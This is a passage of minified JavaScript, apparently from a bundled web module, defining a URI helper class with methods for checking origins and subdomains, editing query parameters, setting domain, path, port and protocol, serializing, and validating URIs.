    };
    b.isSameOrigin = function (a) {
      return c("isSameOrigin")(this, a);
    };
    b.isSubdomainOfDomain = function (b) {
      var c = a.getUri(b);
      return c != null && q(this.domain, b);
    };
    b.isSecure = function () {
      return this.getProtocol() === "https";
    };
    b.removeQueryParams = function (a) {
      if (Array.isArray(a) && a.length > 0) {
        var b = this.getQueryParams();
        a.map(function (a) {
          return b["delete"](a);
        });
        return s(this, {
          queryParams: b
        });
      }
      return this;
    };
    b.removeQueryParam = function (a) {
      if (Boolean(a)) {
        var b = this.getQueryParams();
        b["delete"](a);
        return s(this, {
          queryParams: b
        });
      }
      return this;
    };
    b.replaceQueryParam = function (a, b) {
      if (Boolean(a)) {
        var c = this.getQueryParams();
        c.set(a, b);
        return s(this, {
          queryParams: c
        });
      }
      return this;
    };
    b.replaceQueryParams = function (a) {
      return s(this, {
        queryParams: a
      });
    };
    b.replaceQueryParamString = function (a) {
      if (a != null) {
        a = a.startsWith("?") ? a.slice(1) : a;
        var b = this.getQueryParams();
        a.split("&").map(function (a) {
          a = a.split("=");
          var c = a[0];
          a = a[1];
          b.set(c, a);
        });
        return s(this, {
          queryParams: b
        });
      }
      return this;
    };
    b.setDomain = function (a) {
      if (Boolean(a)) {
        var b = a.split(".");
        b = b.length >= 3 ? b[0] : "";
        return s(this, {
          domain: a,
          subdomain: b
        });
      }
      return this;
    };
    b.setFragment = function (a) {
      return a === "#" ? s(this, {
        fragment: "",
        fragmentSeparator: !0
      }) : s(this, {
        fragment: a,
        fragmentSeparator: a !== ""
      });
    };
    b.setPath = function (a) {
      return a != null ? s(this, {
        path: a
      }) : this;
    };
    b.setPort = function (a) {
      return Boolean(a) ? s(this, {
        port: a
      }) : this;
    };
    b.setProtocol = function (a) {
      return Boolean(a) ? s(this, {
        protocol: a
      }) : this;
    };
    b.setSecure = function (a) {
      return this.setProtocol(a ? "https" : "http");
    };
    b.setSubDomain = function (a) {
      if (Boolean(a)) {
        var b = this.domain.split(".");
        b.length >= 3 ? b[0] = a : b.unshift(a);
        return s(this, {
          domain: b.join("."),
          subdomain: a
        });
      }
      return this;
    };
    b.stripTrailingSlash = function () {
      return this.setPath(this.getPath().replace(/\/$/, ""));
    };
    a.$1 = function (a) {
      a = a;
      for (var b = 0; b < m.length; b++) {
        var c = m[b];
        a = c(a);
      }
      return a;
    };
    b.$2 = function (b, c) {
      c === void 0 && (c = !1);
      return t({
        domain: a.$1(this.domain),
        fragment: this.fragment,
        fragmentSeparator: this.fragmentSeparator,
        isGeneric: this.isGenericProtocol,
        originalRawQuery: this.originalRawQuery,
        path: this.path,
        port: this.port,
        protocol: this.protocol,
        queryParams: this.queryParams,
        serializer: b,
        subdomain: this.subdomain,
        userInfo: ""
      }, !1, c);
    };
    b.toStringRawQuery = function () {
      this.rawStringValue == null && (this.rawStringValue = this.$2(c("PHPQuerySerializerNoEncoding")));
      return this.rawStringValue;
    };
    b.toString = function () {
      this.stringValue == null && (this.stringValue = this.$2(this.serializer));
      return this.stringValue;
    };
    b.toStringPreserveQuery = function () {
      return this.$2(this.serializer, !0);
    };
    a.isValidUri = function (b) {
      var c = h.get(b);
      if (c != null) return !0;
      c = v(b);
      if (c.valid) {
        h.set(b, new a(c.components));
        return !0;
      }
      return !1;
    };
    return a;
  }();
  function a(a) {
    if (a instanceof x) return a;else return null;
  }
  function b(a) {
    m.push(a);
  }
  e = x.getUri;
  f = x.isValidUri;
  g.isSubdomainOfDomain = q;
  g.isConstUri = a;
  g.registerDomainFilter = b;
  g.getUri = e;
  g.isValidUri = f;
}, 98);